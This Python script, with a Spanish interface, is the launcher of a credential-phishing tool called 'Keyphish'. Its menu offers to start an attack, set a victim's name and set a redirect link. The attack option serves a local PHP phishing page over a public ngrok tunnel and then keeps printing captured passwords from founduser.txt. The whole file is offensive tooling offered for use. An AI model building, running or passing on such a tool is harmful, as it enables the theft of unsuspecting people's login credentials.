#-*-coding: utf-8 -*-
## Módulos a importar
import os
import time
clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')

def logo():
    print('      ██╗░░██╗███████╗██╗░░░██╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗')
    print('      ██║░██╔╝██╔════╝╚██╗░██╔╝██╔══██╗██║░░██║██║██╔════╝██║░░██║')
    print('      █████═╝░█████╗░░░╚████╔╝░██████╔╝███████║██║╚█████╗░███████║')
    print('      ██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║')
    print('      ██║░╚██╗███████╗░░░██║░░░██║░░░░░██║░░██║██║██████╔╝██║░░██║')
    print('      ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝')
    print('                                              By Mr.Star')

def cambiarn():
    os.system("gnome-terminal -- python usuario.py")
    clearConsole()
    os.system("python Keyphish.py")

def contra():
    archivo = open('founduser.txt','w')
    archivo.close()
    while True:
        time.sleep(3)
        clearConsole()
        logo()
        archiv= open('founduser.txt')
        print('Contraseñas:                Ctrl+c para salir')
        print(archiv.read())

def link():
    os.system("gnome-terminal -- python link.py")
    clearConsole()
    os.system("python Keyphish.py")


def ngrok():
    os.system("gnome-terminal -- php -S localhost:8080")
    os.system("gnome-terminal -- ngrok http 8080")
    clearConsole()
    contra()
    print("Las contraseñas estaran almacenadas en founduser.txt")


logo()
y=int(input("""             Bienvenido desea:
1- Iniciar ataque
2- Ingresar nombre de la víctima
3- Ingresar link para redireccionar
4- Salir
$=  """))

if y==1:
    clearConsole()
    logo()
    ngrok()
elif y==2:
    cambiarn()
    clearConsole()
elif y==3:
    link()
    clearConsole()
elif y==4:
    print("  HASTA PRONTO!!")
